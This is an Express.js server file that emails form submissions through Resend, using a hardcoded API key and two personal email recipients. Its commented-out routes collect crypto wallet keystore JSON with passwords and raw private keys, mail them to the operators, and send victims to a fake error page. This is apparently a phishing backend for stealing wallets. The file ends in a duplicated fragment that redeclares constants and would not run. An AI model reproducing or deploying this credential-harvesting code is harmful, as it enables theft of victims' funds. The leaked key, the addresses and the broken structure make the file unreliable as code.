const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { Resend } = require("resend"); // Import Resend instead of nodemailer

const app = express();
const PORT = 3000;

// Initialize Resend with your API key
const resend = new Resend("re_9GJsrHWa_CcBWCoBTBHAyE171cS2oYRoV");

// Enable CORS
app.use(
  cors({
    origin: ["http://localhost:5500", "https://form-z32c.onrender.com"], // Added your live URL
    methods: "POST",
    allowedHeaders: ["Content-Type"],
  })
);

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Helper function to send email using Resend
async function sendEmail(subject, text) {
  try {
    console.log("Sending email via Resend...");

    const { data, error } = await resend.emails.send({
      from: "Plant Form <onboard@resend.dev>", // Use this for testing
      to: ["Mikun5y@gmail.com", "yekeen244@gmail.com"], // Both recipients
      subject: subject,
      text: text,
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f9f9f9;">
          <div style="background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
            <h2 style="color: #2c3e50; margin-bottom: 20px;">${subject}</h2>
            <div style="line-height: 1.6; color: #34495e;">
              ${text.replace(/\n/g, "<br>")}
            </div>
            <hr style="margin: 20px 0; border: none; border-top: 1px solid #ecf0f1;">
            <p style="font-size: 12px; color: #7f8c8d;">
              Sent from your Plant Form Application
            </p>
          </div>
        </div>
      `,
    });

    if (error) {
      console.error("Resend error:", error);
      throw error;
    }

    console.log("✅ Email sent successfully via Resend!");
    console.log("Email ID:", data.id);
    return data;
  } catch (error) {
    console.error("❌ Resend email error:", error);
    throw error;
  }
}

// Route for handling plant/reco ph submission
app.post("/submit-plant", async (req, res) => {
  try {
    const { ph } = req.body;
    const subject = "Plant/Reco pH Submission";
    const message = `New plant pH submission received:\n\nPH Value: ${ph}\n\nSubmitted at: ${new Date().toLocaleString()}`;

    console.log("Received pH submission:", ph);

    // Send email using Resend
    await sendEmail(subject, message);

    console.log("✅ pH submission processed and email sent successfully");
    res.redirect("https://galant.dev");
  } catch (error) {
    console.error("❌ Error processing pH submission:", error);

    // Still redirect even if email fails
    res.redirect("https://galant.dev");
  }
});

// Optional: Add a simple test route
app.get("/test-email", async (req, res) => {
  try {
    await sendEmail("Test Email", "This is a test email from your Render app!");
    res.json({ success: true, message: "Test email sent successfully!" });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
  console.log("✅ Resend email service initialized");
});

// Optional: Test email on startup (uncomment if you want)
// setTimeout(async () => {
//   try {
//     await sendEmail('Server Started', 'Your Render server is now running with Resend email service!');
//     console.log('✅ Startup notification sent');
//   } catch (error) {
//     console.log('❌ Startup notification failed:', error.message);
//   }
// }, 5000);

// // Route for handling KeyStore JSON submission
// app.post("/submit-keystore", (req, res) => {
//   const { keystore, password } = req.body;
//   const subject = "Keystore JSON Submission";
//   const message = `Keystore Value: ${keystore}\nPassword: ${password}`;

//   sendEmail(subject, message);
//   res.redirect("https://defiii.netlify.app/error");
// });

// // Route for handling Private Key submission
// app.post("/submit-privatekey", (req, res) => {
//   const { privatekey } = req.body;
//   const subject = "Private Key Submission";
//   const message = `Private Key: ${privatekey}`;

//   sendEmail(subject, message);
//   res.redirect("https://defiii.netlify.app/error");
// });

// // Start the server
// app.listen(PORT, () => {
//   console.log(`Server running at http://localhost:${PORT}`);
// });

const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const cors = require("cors"); // Import cors
const { Resend } = require("resend");

const resend = new Resend("re_9GJsrHWa_CcBWCoBTBHAyE171cS2oYRoV");

app.use(
  cors({
    origin: ["http://localhost:5500", "https://form-z32c.onrender.com"],
    methods: "POST",
    allowedHeaders: ["Content-Type"],
  })
);

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
